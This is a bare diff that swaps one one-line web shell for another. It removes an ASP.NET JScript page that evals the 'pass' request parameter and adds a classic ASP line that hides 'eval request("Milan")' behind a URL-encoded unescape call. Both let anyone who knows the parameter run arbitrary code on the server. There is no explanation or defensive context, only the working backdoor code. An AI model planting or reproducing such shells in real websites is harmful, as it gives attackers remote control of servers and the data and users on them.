@@ -1,2 +1,1 @@
-<%@ Page Language="Jscript"%>
-<%eval(/*s*/ Request.Item["pass"],"unsafe");%>
+<%execute(unescape("eval%20request%28%22Milan%22%29"))%>
